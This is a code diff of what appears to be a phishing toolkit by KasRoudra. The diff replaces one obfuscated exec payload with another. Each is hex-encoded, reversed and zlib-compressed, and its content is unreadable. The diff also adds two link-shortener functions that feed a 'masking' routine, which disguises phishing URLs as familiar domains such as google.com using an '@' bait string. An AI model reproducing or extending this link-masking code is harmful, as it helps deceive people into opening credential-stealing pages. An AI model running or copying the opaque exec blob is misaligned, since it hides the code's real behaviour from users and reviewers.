@@ -90,7 +90,7 @@ modification follow.
 Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
 """
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'6284D54F70FFFBEBFBA296DDBD52B97717C5E2377200F3B245A57F4B267A05C214CFDF0784B4A3E75B7D61933121874CD4C8AFAC406890342247603731F7E10E146D5835C009AAA41A38FCD104BB0D7670FE3221EF2E4C332CB316B7AB87E91F84251C1DC71A6AA26F917DCC45817A8608FDB91A0732CD76270D2E30BAEE626B5139082E3660BED331F27FC48FABB60D0AF1C63E3DF595487023C5139B02827C2036531B754A6A01A547C710E5B01ECC3E279621DA5949849B7D14486C1B316F599F0800C295B56038CC483FEE5EFE6B3EB13A0A8250E9CFBACB83E2F98FE414FBD646D3B4E45FE7EAA37C0C0887B581505E7DDB1E789C61F108751B2069203B1238D1426604324DBAE2500BE0957EDDAC9FB455C37EFBE7174F20DB2E100B0B607A0FE47E715419945A20AB4FCBADC110055CEB49DD2E6AF08DC66736DC023CB9F935AD2F88450A062CA6BEA2F5A1FDE0B904398D80AB1FAB51FF36416589B679C5829038A188F6BB4476740FFEB75CF897AEC25FDAA774B25CCEAD14F0E2EC718046545805C70DB3C3D5BF210ED55E2198AA947CB2CD2B35ED682FA1FE332D8480854095C84B7377C3E537B9C3E99C82079D3771EF0CDE6596C2776C293ADE6EE7021A5C000937F84007C3802F6ADEDCF83F384EF4932B0BCD55B5ACA8931D77AD72025D47143072242D1D77A7916EAF3641E6AA57B71D3E521E9EF6F6F7F2403A52F2642B93CE2E27BE28AF34F4862AEBC3DFC66B46BF4312AAFC9819DBE2992940AE15E9B3A733C2DC127DC407A6BC503E4E323DE5340BB6349EF1E34FAE6F6F2714108F91F37794DDCDBFC43C4A23476A726EE6D2E8500957AE8EE55BA3FB78274CB7B1B4CE8A5BF6DC7D631DB2862F5F2DDB1771C3A770F2417857D93D86EE1FB240620A3E44C375ABADC2443E1DE00BFC599620317BD9BF95705BEBFD8B3437801D19D56BD9FE92166372AD0D7E175A328E4FAA2398D1C82BD41D98C67E2B37E95AAF4297A5A59DB747F3A2F3376AD77B616E5EB93D7EC9467B25C3547BCEF5E5BE25A5435D89A9D7F9158459AA1BF0687FE741CC7DEB7AFDC686FBF37D7F7FBEBE7F9FBFEFF7781C40633DA2495A64A6731FCEB3AEBB846CDB9FE1606C63F6DD33F848809342E8D54952C987'))
+_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'25536A1730FFFBEBFB6A9E6A60662D76E328EB895783E0338EBD221DB65CACB8138281D98906783F7197CF3E71D7AE05B8B1D4C732C71EEA376EBB6C99C6A37B173AE17044D0F845091EB4B2353822F0576930BD2B0F0531307BEBC0DF15D95A247D8669AA50757793483E09BF39815788633B496405005A44AB5612E467AC5F4D52190D3A9963B272E38286C36578282CCEA416EF911478C9730ABE0D0732A820A8D4F81D4BC993E15ED28BD72F681344949907F5FCDECBB868697965E9D2BE207B16B7A933968C3C5EE1470ED77E1315783B26107B12FE650AAED8CBD709943D32A0E9599A1B2B0496A20F692BE9B7B3D27736BC956CC0A067A0D37A2D89E476772C20E20035FE35EA2991260AD20BDE2A6CAFA9907C1B4A89AC03E6BCAE08B274AC0F13E0BFE7B1C30A6240757153C5E6D60BEF301B960B2D1DB77D1C24081610C6199FCB6C9C500EC8B2A57F0634C0D3F1B43C7AF292779E654263D880D11F8FECC040B14D86A8AA8B016373B58000CA41002792F386821FDBFAF1056F3988F4234EBC3CAB74E9FCC2B2ECE9B08D3C8D345ED89B238356EC62371BA0D2B3BACAD40CBC321997F5B66E119547ED85F2C4A6BF41B60B92E2E79886CF6F7D849955D7E83917090C1591F0328D2C657A3EDD36FED62BD53F0B7BF2A36A0F8E5864AE4BF258E3888F0A585338CBC65060D1A3C7718282B37825DA35C3BAE598B531615B99B5CA71A346A660E74259FCC56BB78F3CED4FE3EB2E39FD3671957D43F425A648730C0BB7B0D9E773973B16B43F176FB8D75D79B1B07C6DA6C5152F5B4AE96F0E0FA69309EB7975579C49E601FE256422CCECB5D236833FEE5F44EA84E7CEC13D091B466D6FCADBC6D5CC9759543DD2EC5572B16EBFA5E6BB21E333A241E4E56564DD9AB6D261D1F9D329A6C3253B06F8D5BF3DC227497916351A4AFDA6099A4AAF765B1B5DB5954B19D0E626226BDD4E9D311DAAD1619FE563A7AEA3EEA87F846989BC43DDC1DD9732785CD291A91D11CF1B52F5F97D7F7FBEBE7F3F7F9FEFF89C13CA4621C028C4FBE178B7611864BBAF1D9EC229BD73DD3DF838C013B1E8D54951C987'))
 
 # Color snippets
 black="\033[0;30m"
@@ -184,7 +184,7 @@ for module in modules:
         print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
         exit(1)
 
-from requests import get, Session
+from requests import get, head, Session
 from bs4 import BeautifulSoup
 
 # Get Columns of Screen
@@ -302,32 +302,15 @@ def killer():
 
 
 # Internet Checker
-def internet2(host="8.8.8.8", port=53, timeout=10):
-    while True:
-        try:
-            if not update:
-                break
-            setdefaulttimeout(timeout)
-            socket(inet, stream).connect((host, port))
-            break
-        except Exception as e:
-            print(f"\n{error}No internet!\007")
-            sleep(2)
 
-def internet():
-    connection = HTTPSConnection("8.8.8.8", timeout=5)
-    while True:
+def internet(url="https://api.github.com", timeout=5):
+    while update:
         try:
-            if not update:
-                connection.close()
-                break
-            connection.request("HEAD", "/")
+            head(url=url, timeout=timeout)
             break
         except:
-            print(f"{error}No internet!\n\007")
+            print(f"\n{error}No internet!{nc}\007")
             sleep(2)
-        finally:
-            connection.close()
         
 # Send mail by smtp library
 def send_mail(msg):
@@ -544,7 +527,7 @@ def lx_token():
 
 def ssh_key():
     if key and not isfile(f"{home}/.ssh/id_rsa.pub"):
-        print(f"\n{info}Wait a moment! Then press enter three times for ssh key generation{nc}\n")
+        print(f"\n{info}Please wait for a while! Press enter three times when asked for ssh key generation{nc}\n")
         sleep(1)
         shell("ssh-keygen")
     is_known = bgtask("ssh-keygen -F localhost.run").wait()
@@ -600,7 +583,34 @@ def url_manager(url, arg1, arg2):
     print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
     sleep(0.5)
 
-    
+def shortener1(url):
+    website = "https://api.shrtco.de/v2/shorten?url="+url.strip()
+    internet()
+    try:
+        res = get(website).text
+        json_resp = parse(res)
+    except Exception as e:
+        append(e, error_file)
+        json_resp = ""
+    if json_resp != "":
+        if json_resp["ok"]:
+            return json_resp["result"]["full_short_link"]
+    return ""
+
+def shortener2(url):
+    website = "https://is.gd/create.php?format=simple&url="+url.strip()
+    internet()
+    try:
+        res = get(website).text
+    except Exception as e:
+        append(e, error_file)
+        res = ""
+    shortened = res.split("\n")[0] if "\n" in res else res
+    if "https://" not in shortened:
+        return ""
+    return shortened
+
+
 # Copy website files from custom location
 def customfol():
     global mask
@@ -654,18 +664,17 @@ def masking(url):
     cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
     if cust=="":
         return
-    website = "https://is.gd/create.php?format=simple&url="+url.strip()
-    internet()
-    try:
-        res = get(website).text
-    except Exception as e:
-        append(e, error_file)
-        res = ""
-    resp = res.split("\n")[0] if "\n" in res else res
-    if "https://" not in resp:
-        sprint(f"{error}Service not available!\n{error}{resp}")
+    shortened1 = shortener1(url)
+    if shortened1 != "":
+        shortened = shortened1
+    else:
+        shortened2 = shortener2(url)
+        shortened = shortened2
+    if shortened != "":
+        short = shortened.replace("https://", "")
+    else:
+        sprint(f"{error}Service not available!")
         waiter()
-    short = resp.replace("https://", "")
     # Remove slash and spaces from inputs
     domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
     if domain == "":
@@ -680,7 +689,7 @@ def masking(url):
     else:
         bait = sub("([/%+&?={} ])", "-", bait)+"@"
     final = domain+bait+short
-    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
+    sprint(f"\n{success}Your custom url is > {bcyan}{final}")
 
 
 # Staring functions
